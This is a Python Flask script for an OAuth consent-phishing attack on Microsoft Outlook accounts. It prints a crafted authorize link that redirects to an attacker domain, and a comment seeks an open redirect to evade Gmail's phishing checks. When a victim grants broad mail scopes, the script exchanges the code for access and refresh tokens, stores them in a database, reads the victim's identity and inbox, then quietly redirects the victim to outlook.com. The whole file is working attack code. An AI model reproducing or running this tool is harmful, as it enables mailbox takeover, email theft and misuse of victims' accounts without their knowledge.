#!/usr/bin/python

'''
	!!! You should run this on your server with the correct redirect_uri domain. !!! 
'''
from httplib2 import Http
from oauth2client import file, client, tools
from flask import Flask , request ,redirect
import urllib 
import requests 
import json 
import sqlite3 
import pprint

app = Flask(__name__) 

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class OutlookOauthServer(object):
	def __init__(self):
		#self.resultUrl = 'https://accounts.google.com/o/oauth2/v2/auth?redirect_uri={}&prompt=consent&response_type=code&client_id={}&g={}&access_type=offline'
		self.resultUrl = "https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&redirect_uri={}&client_id={}"
		self.oauthClientId = "ccfa86f2-dff5-44ff-8d62-644ec50ba9f6"
		self.oauthSecret = ""
		self.redirectUrl = 'https://tck.bz'
		self.scopes = ['Mail.ReadWrite','Mail.ReadWrite.Shared','Mail.Send','MailboxSettings.ReadWrite','User.Read', 'offline_access']
		self.token_endpoint = "https://login.microsoftonline.com/common/oauth2/v2.0/token" 
		self.graph_endpoint = 'https://graph.microsoft.com/v1.0{}'

		# setup a db as well 
		self.conn = self.createDbConnection("./outlookOauthServer.db")
		self.createTables() 


	def createDbConnection(self,db_file):
		try:
			conn = sqlite3.connect(db_file, check_same_thread=False)
		except Error as e:
			print "[!] Unable to connect to database " + bcolors.WARNING + e + bcolors.ENDC 
			return
		return conn 

	def createTables(self):
		create_user_table_sql = """ CREATE TABLE IF NOT EXISTS users (
                                        id integer PRIMARY KEY,
                                        access_token text NOT NULL,
                                        refresh_token text,
                                        expires_in integer
                                    ); """
		try:
			c = self.conn.cursor()
			c.execute(create_user_table_sql)
		except sqlite3.Error as e:
			print "[!] Unable to connect to database " + bcolors.WARNING + e + bcolors.ENDC
		print "[*] " + bcolors.BOLD + "Database created!" + bcolors.ENDC 

	def createUserRecord(self, access_token, refresh_token, expires_in):
		try:
			c = self.conn.cursor()
			c.execute("INSERT INTO users (access_token, refresh_token, expires_in) VALUES (?,?,?)", [access_token, refresh_token, expires_in])
			self.conn.commit()
		except sqlite3.Error as e :
			print "[!] Failed to insert record " + bcolors.WARNING + e.args[0] + bcolors.ENDC  
			return 
		print "[*] " + bcolors.BOLD + "Record created!" + bcolors.ENDC 

	def createEmailRecord(self):
		return

	def getCraftedURL(self):
		''' need an open redirection from google domain to bypass phishing check in gmail '''
		target_location = self.resultUrl.format(self.redirectUrl, self.oauthClientId) 
		print "[*] Crafted URL : "  + bcolors.BOLD + target_location + bcolors.ENDC
		return


	def refreshAccessToken(self):
		# token_endpoint + 
		#client_secret=************&grant_type=refresh_token&refresh_token=1%2FalNma4SvIdoK8M99udGpWkcqu3HYLzVNBNASTfSz3Cc&client_id=407408718192.apps.googleusercontent.com
		# return access_token 
		return 

@app.route('/')
def hello_world():
	user_code = request.args.get('code') # getting exchange token  
	if user_code == None:
		return "Welcome to my site."

	# now we can exchange access_token with client_secret 
	print "[*] code obtained " + bcolors.BOLD + user_code[:20] + "..."  + bcolors.ENDC
	response = requests.post(outlookServer.token_endpoint, data={'code':user_code, 'scope':' '.join(outlookServer.scopes), 'redirect_uri':outlookServer.redirectUrl, 'client_id':outlookServer.oauthClientId, 'client_secret':outlookServer.oauthSecret, 'grant_type':'authorization_code'})

	if response.status_code == 200:
		responseData = json.loads(response.text)
		access_token = responseData['access_token']
		print "[*] Access Token obtained : " + bcolors.BOLD + responseData['access_token'][:20] + "..." + bcolors.ENDC
		print "[*] Refresh Token obtained : " + bcolors.BOLD + responseData['refresh_token'][:20] + "..." + bcolors.ENDC
		outlookServer.createUserRecord(responseData['access_token'], responseData['refresh_token'], responseData['expires_in'])
		
		response = requests.get(outlookServer.graph_endpoint.format("/me"), headers={'Authorization': 'Bearer {}'.format(access_token), 'Accept':'application/json'}, params={'$select': 'displayName,mail'})
		# let chuck it to db 
		if response.status_code == requests.codes.ok:
			responseData = json.loads(response.text)
			print "[*] " + bcolors.BOLD + responseData['mail'] + bcolors.ENDC + " connected."
			print "[*] Starting to fetch emails" 

		response = requests.get(outlookServer.graph_endpoint.format("/me/mailfolders/inbox/messages"), headers={'Authorization': 'Bearer {}'.format(access_token), 'Accept':'application/json'}, params={'$top': '10',
                      '$select': 'receivedDateTime,subject,from',
                      '$orderby': 'receivedDateTime DESC'})
		# let chuck it to db 
		if response.status_code == requests.codes.ok:
			responseData = json.loads(response.text)
			for e in responseData['value']: 
				print json.dumps(e, indent=4)


	else:
		print "[!] ERROR " + bcolors.WARNING + str(response.status_code) + " " + response.text + bcolors.ENDC 

	# probably just wanna redirect user back to gmail or gdrive or wtever that make sense 
	return redirect("https://outlook.com", code=302)
	#return 'Welcome .'

outlookServer = OutlookOauthServer() 
outlookServer.getCraftedURL()

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=80)
